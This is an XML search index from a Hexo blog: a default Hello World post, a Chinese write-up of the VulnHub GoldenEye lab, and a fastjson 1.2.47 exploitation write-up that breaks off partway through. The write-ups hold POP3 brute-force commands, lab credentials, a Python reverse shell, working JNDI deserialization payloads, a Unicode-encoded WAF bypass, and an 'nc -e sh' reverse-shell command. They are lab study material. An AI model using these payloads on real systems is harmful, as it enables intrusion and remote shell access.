<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Hello World</title>
    <url>/2024/09/07/hello-world/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>VulnHub-GoldenEye</title>
    <url>/2024/07/15/VulnHub-GoldenEye/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="靶机探测"><a href="#靶机探测" class="headerlink" title="靶机探测"></a>靶机探测</h2><p>首先使用nmap探测一下靶机的IP地址<br><code>nmap 192.168.206.124/24</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.167
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00013s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">998</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE
<span class="token number">25</span>/tcp <span class="token function">open</span>  smtp
<span class="token number">80</span>/tcp <span class="token function">open</span>  http
MAC Address: 00:0C:29:10:35:1F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>进一步探测靶机信息</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>
└─<span class="token comment"># nmap 192.168.206.167 -p- -sS -A</span>
Starting Nmap <span class="token number">7.92</span> <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-07-15 <span class="token number">15</span>:30 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.206.167
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.0012s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">65531</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT      STATE SERVICE  VERSION
<span class="token number">25</span>/tcp    <span class="token function">open</span>  smtp     Postfix smtpd
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span>_smtp-commands: ubuntu, PIPELINING, SIZE <span class="token number">10240000</span>, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>ubuntu
<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:22:34
<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-21T03:22:34
<span class="token number">80</span>/tcp    <span class="token function">open</span>  http     Apache httpd <span class="token number">2.4</span>.7 <span class="token variable"><span class="token punctuation">((</span>Ubuntu<span class="token punctuation">))</span></span>
<span class="token operator">|</span>_http-title: GoldenEye Primary Admin Server
<span class="token operator">|</span>_http-server-header: Apache/2.4.7 <span class="token punctuation">(</span>Ubuntu<span class="token punctuation">)</span>
<span class="token number">55006</span>/tcp <span class="token function">open</span>  ssl/pop3 Dovecot pop3d
<span class="token operator">|</span>_pop3-capabilities: AUTH-RESP-CODE SASL<span class="token punctuation">(</span>PLAIN<span class="token punctuation">)</span> <span class="token environment constant">USER</span> RESP-CODES CAPA PIPELINING TOP UIDL
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>localhost/organizationName<span class="token operator">=</span>Dovecot mail server
<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:23:52
<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-23T03:23:52
<span class="token number">55007</span>/tcp <span class="token function">open</span>  pop3     Dovecot pop3d
<span class="token operator">|</span>_pop3-capabilities: RESP-CODES PIPELINING SASL<span class="token punctuation">(</span>PLAIN<span class="token punctuation">)</span> AUTH-RESP-CODE <span class="token environment constant">USER</span> CAPA STLS TOP UIDL
<span class="token operator">|</span>_ssl-date: TLS randomness does not represent <span class="token function">time</span>
<span class="token operator">|</span> ssl-cert: Subject: <span class="token assign-left variable">commonName</span><span class="token operator">=</span>localhost/organizationName<span class="token operator">=</span>Dovecot mail server
<span class="token operator">|</span> Not valid before: <span class="token number">2018</span>-04-24T03:23:52
<span class="token operator">|</span>_Not valid after:  <span class="token number">2028</span>-04-23T03:23:52
MAC Address: 00:0C:29:10:35:1F <span class="token punctuation">(</span>VMware<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">3</span>.X<span class="token operator">|</span><span class="token number">4</span>.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux <span class="token number">3.2</span> - <span class="token number">4.9</span>
Network Distance: <span class="token number">1</span> hop

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">1.16</span> ms <span class="token number">192.168</span>.206.167

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">39.75</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>访问80端口：<br><img src="https://i-blog.csdnimg.cn/direct/123a06efaa7e49b09979a699a3c2e1f0.png" alt=" "></p>
<p><a href="http://192.168.206.167/sev-home/%E6%98%AF%E4%B8%80%E4%B8%AA%E7%99%BB%E5%BD%95%E7%AA%97%E5%8F%A3">http://192.168.206.167/sev-home/是一个登录窗口</a><br>查看源码发现一个js文件<br><img src="https://i-blog.csdnimg.cn/direct/b862e7b669b5483cb9ed5c188ea8f484.png" alt=" "></p>
<p>存在一段密文:<br><code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code><br>解密之后得到:<br><code>InvincibleHack3r</code></p>
<h2 id="密码暴破"><a href="#密码暴破" class="headerlink" title="密码暴破"></a>密码暴破</h2><p>那么结合出现的两个用户名<code>Boris</code>和<code>Natalya</code>，尝试一下爆破账密登录刚才的登录口，大小写都试试。<br><code>boris/InvincibleHack3r</code>登录成功，看到提示：</p>
<p><img src="https://i-blog.csdnimg.cn/direct/e5d4296a06e5446b9270f6316e514960.png" alt=" "></p>
<p>可知下面就是针对55007端口啦<br>使用九头蛇进行爆破:<br><code>hydra -L GodenEye.txt  -P /usr/share/wordlists/fasttrack.txt 192.168.206.167 -s 55007 pop3</code></p>
<p><img src="https://i-blog.csdnimg.cn/direct/7b22633e017a4bf7990cdc8bbe653053.png" alt=" "></p>
<h2 id="pop服务访问"><a href="#pop服务访问" class="headerlink" title="pop服务访问"></a>pop服务访问</h2><p>pop3登录例子：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@kali:~<span class="token comment"># telnet $ip 110</span>
 +OK beta POP3 server <span class="token punctuation">(</span>JAMES POP3 Server <span class="token number">2.3</span>.2<span class="token punctuation">)</span> ready 
 <span class="token environment constant">USER</span> billydean    
 +OK
 PASS password
 +OK Welcome billydean
 
 list
 
 +OK <span class="token number">2</span> <span class="token number">1807</span>
 <span class="token number">1</span> <span class="token number">786</span>
 <span class="token number">2</span> <span class="token number">1021</span>

 retr <span class="token number">1</span>
 
 +OK Message follows
 From: jamesbrown@motown.com
 Dear Billy Dean,

 Here is your login <span class="token keyword">for</span> remote desktop <span class="token punctuation">..</span>. try not to forget it this time<span class="token operator">!</span>
 username: billydean
 password: PA<span class="token variable">$$</span>W0RD<span class="token operator">!</span>Z
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>挨个访问，natalya用户有2个邮件：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id D5EDA454B1
        for &lt;natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
Message-Id: &lt;20180425024542.D5EDA454B1@ubuntu>
Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
From: root@ubuntu

Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.

Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@ubuntu>
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 17C96454B1
        for &lt;natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
Message-Id: &lt;20180425031956.17C96454B1@ubuntu>
Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
From: root@ubuntu

Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
**Make sure to edit your host file since you usually work remote off-network....

Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>boris有3个邮件：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;root@127.0.0.1.goldeneye>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id D9E47454B1
        for &lt;boris>; Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
Message-Id: &lt;20180425022326.D9E47454B1@ubuntu>
Date: Tue, 2 Apr 1990 19:22:14 -0700 (PDT)
From: root@127.0.0.1.goldeneye

Boris, this is admin. You can electronically communicate to co-workers and students here. I'm not going to scan emails for security risks because I trust you and the other admins here.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;natalya@ubuntu>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from ok (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id C3F2B454B1
        for &lt;boris>; Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
Message-Id: &lt;20180425024249.C3F2B454B1@ubuntu>
Date: Tue, 21 Apr 1995 19:42:35 -0700 (PDT)
From: natalya@ubuntu

Boris, I can break your codes!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;alec@janus.boss>
X-Original-To: boris
Delivered-To: boris@ubuntu
Received: from janus (localhost [127.0.0.1])
        by ubuntu (Postfix) with ESMTP id 4B9F4454B1
        for &lt;boris>; Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
Message-Id: &lt;20180425025235.4B9F4454B1@ubuntu>
Date: Wed, 22 Apr 1995 19:51:48 -0700 (PDT)
From: alec@janus.boss

Boris,

Your cooperation with our syndicate will pay off big. Attached are the final access codes for GoldenEye. Place them in a hidden file within the root directory of this server then remove from this email. There can only be one set of these acces codes, and we need to secure them for the final execution. If they are retrieved and captured our plan will crash and burn!

Once Xenia gets access to the training site and becomes familiar with the GoldenEye Terminal codes we will push to our final stages....

PS - Keep security tight or we will be compromised.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据邮件信息得到一个网站的账号密码<br>username: xenia<br>password: RCP90rulez!<br>先改一下host文件，登录成功！<br>登录之后得到的信息如下：<br>1、存在admin、doak用户<br>2、cms版本为moodle2.2.3<br>爆破doak的密码为goat，查看邮件信息：</p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">Return-Path: &lt;doak@ubuntu>
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak (localhost [127.0.0.1])
        by ubuntu (Postfix) with SMTP id 97DC24549D
        for &lt;doak>; Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
Message-Id: &lt;20180425034731.97DC24549D@ubuntu>
Date: Tue, 30 Apr 1995 20:47:24 -0700 (PDT)
From: doak@ubuntu

James,
If you're reading this, congrats you've gotten this far. You know how tradecraft works right?

Because I don't. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用上面的账密登录网站，登录之后发现文件<br><img src="https://i-blog.csdnimg.cn/direct/fbae555517114be5b51371fda2557e10.png" alt=" "></p>
<pre class="line-numbers language-text" data-language="text"><code class="language-text">007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>下载文件之后在图片属性里看到一段密文：eFdpbnRlcjE5OTV4IQ&#x3D;&#x3D;&#x2F;xWinter1995x!<br><img src="https://i-blog.csdnimg.cn/direct/77c32edab5f54859b875711a7fbde2b2.png" alt=" "><br>尝试登陆一下admin&#x2F;xWinter1995x!</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>搜索moodle2.2.3漏洞进行复现<br><img src="https://i-blog.csdnimg.cn/direct/e8549cd137144605b50eecc0b2d4899a.png" alt=" "><br>然后在这里输入反弹shell<br><img src="https://i-blog.csdnimg.cn/direct/ae4847e514f74bc1b5eb8c2bd6934ef2.png" alt=" "><br><code>python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.206.138&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;</code><br>然后编辑一篇文章<br><img src="https://i-blog.csdnimg.cn/direct/5d08efbe22234070bb5406f329e80380.png" alt=" "><br>拿到shell。</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>进行信息收集发现内核版本为3.13.0，<a href="https://www.exploit-db.com/exploits/37292">提权脚本</a><br>注意将脚本中的gcc改为cc后编译进行提权<br><img src="https://i-blog.csdnimg.cn/direct/9bad6b668e594226828d3d28ef586805.png" alt=" "></p>
]]></content>
      <categories>
        <category>靶场</category>
      </categories>
  </entry>
  <entry>
    <title>fastjson-漏洞复现</title>
    <url>/2024/03/29/fastjson-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>借助<a href="https://github.com/lemono0/FastJsonParty">FastJsonParty</a>靶场进行一下fastjson一些版本漏洞的复现</p>
<h2 id="1-2-47-jndi（出网）"><a href="#1-2-47-jndi（出网）" class="headerlink" title="1.2.47-jndi（出网）"></a>1.2.47-jndi（出网）</h2><p>我使用自己的服务器搭建的靶场，访问登陆页面之后抓包登录数据， 传入的数据为json格式<br><img src="https://img-blog.csdnimg.cn/direct/8ebff2e5677546d1bdce8f33dbaf2330.png" alt="123"></p>
<p>尝试让其进行报错，比如说删除一个<code>&#125;</code>,<code>&quot;</code><br>报错数据</p>
<pre class="line-numbers language-none"><code class="language-none">HTTP&#x2F;1.1 500 
Content-Type: application&#x2F;json
Date: Thu, 28 Mar 2024 03:48:20 GMT
Connection: close
Content-Length: 160

&#123;&quot;timestamp&quot;:&quot;2024-03-28T03:48:20.909+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;syntax error, position at 0, name password&quot;,&quot;path&quot;:&quot;&#x2F;login&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>标准的fastjson错误提示，确定后端使用了fastjson。<br>使用dnslog测试一下</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>
  <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"nf8mm5.dnslog.cn"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/f7a9c69af6054630a3a16340ddf783d6.png" alt="12"><br><img src="https://img-blog.csdnimg.cn/direct/e6b51ba169b64038a26eb9975355f52b.png" alt="123"></p>
<p>也收到了请求，说明存在漏洞。此时我们还需要知道存在的漏洞版本<br>开始探测fastjson的精确版本</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>通过报错信息可以看出版本为1.2.47<br><img src="https://img-blog.csdnimg.cn/direct/5dfcf1c427b242cb8d23826b92d52430.png" alt="123"><br>利用mappings缓存机制，JdbcRowSetImpl打jndi，但前提是需要机器出网。关于这种方式探测fastjosn版本，条件是需要response中会回显报错信息，但实际环境可能存在不回显的情况，那就需要利用其他手段了，如dnslog、ddos等间接判断。<br>使用jndi注入工具<a href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit-1.0-SNAPSHOT-all</a>。可以使用nc反弹shell。<br>将该工具上传到kali，开启服务</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">java</span> <span class="token parameter variable">-jar</span> JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar <span class="token parameter variable">-A</span> <span class="token number">123.60</span>.157.194 <span class="token parameter variable">-C</span> <span class="token string">"nc 123.60.157.194 9999 -e sh"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/direct/7a76d0a9874f461f876d9a0ceef3fbfb.png" alt="123"><br>然后服务器再监听一个端口9999</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://123.60.157.194:1389/2kgqlp"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>send之后就会接收到shell<br><img src="https://img-blog.csdnimg.cn/direct/645b700e502a4db2a1a06ef697d7ccd7.png" alt="456"><br>在复现过程中我使用了windows进行开启服务，一直出现以下报错：<br><img src="https://img-blog.csdnimg.cn/direct/ff477a4244144e31a265665610b55639.png" alt="456"><br>原因就是1389已经被占用，尝试了几次更换kali之后就可以正常打了。</p>
<h2 id="1247-jndi-waf"><a href="#1247-jndi-waf" class="headerlink" title="1247-jndi-waf"></a>1247-jndi-waf</h2><h3 id="检测是否是fastjson的方法"><a href="#检测是否是fastjson的方法" class="headerlink" title="检测是否是fastjson的方法"></a>检测是否是fastjson的方法</h3><p>1、去掉<code>&#125;</code>或<code>&quot;</code></p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"username"</span><span class="token operator">:</span><span class="token string">"ad"</span><span class="token punctuation">,</span><span class="token property">"password"</span><span class="token operator">:</span><span class="token string">"ad"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>2、dnslog探测</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.net.Inet4Address"</span><span class="token punctuation">,</span>
  <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"nf8mm5.dnslog.cn"</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="检测fastjson精确版本"><a href="#检测fastjson精确版本" class="headerlink" title="检测fastjson精确版本"></a>检测fastjson精确版本</h3><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-blog.csdnimg.cn/direct/b81072e29e524bc485f2f47c28b3e562.png" alt="123"><br>从报错信息看出来被拦截了，根据项目文件可以知道过滤的字符：</p>
<p><img src="https://img-blog.csdnimg.cn/direct/7a71c623ed304f31bc1aba470e4a17c2.png" alt="本身"><br>fastjson本身是默认识别并编码hex和Unicode编码的，所以利用这个特性进行绕过。<br>将数据进行Unicode编码</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
  <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0041\u0075\u0074\u006F\u0043\u006C\u006F\u0073\u0065\u0061\u0062\u006C\u0065"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>得到了具体版本：<br><img src="https://img-blog.csdnimg.cn/direct/37f83cba0d404094beeba4b390a2019d.png" alt="123"></p>
<p>然后按照上面的payload，只需进行一下Unicode编码即可</p>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"a"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.Class"</span><span class="token punctuation">,</span>
        <span class="token property">"val"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"b"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"com.sun.rowset.JdbcRowSetImpl"</span><span class="token punctuation">,</span>
        <span class="token property">"dataSourceName"</span><span class="token operator">:</span><span class="token string">"ldap://123.60.157.194:1389/qz9noe"</span><span class="token punctuation">,</span>
        <span class="token property">"autoCommit"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>
    <span class="token property">"\u0061"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073"</span><span class="token punctuation">,</span>
        <span class="token property">"\u0076\u0061\u006C"</span><span class="token operator">:</span><span class="token string">"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token property">"\u0062"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>
        <span class="token property">"\u0040\u0074\u0079\u0070\u0065"</span><span class="token operator">:</span><span class="token string">"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"</span><span class="token punctuation">,</span>
        <span class="token property">"\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065"</span><span class="token operator">:</span><span class="token string">"\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0031\u0032\u0033\u002E\u0036\u0030\u002E\u0031\u0035\u0037\u002E\u0031\u0039\u0034\u003A\u0031\u0033\u0038\u0039\u002F\u0071\u007A\u0039\u006E\u006F\u0065"</span><span class="token punctuation">,</span>
        <span class="token property">"\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074"</span><span class="token operator">:</span><span class="token boolean">true</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>攻击机开启监听端口</p>
<blockquote>
<p>root@n0rt6:~# nc -lnvp 9999</p>
</blockquote>
<p>使用<code>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code>开启服务:</p>
<blockquote>
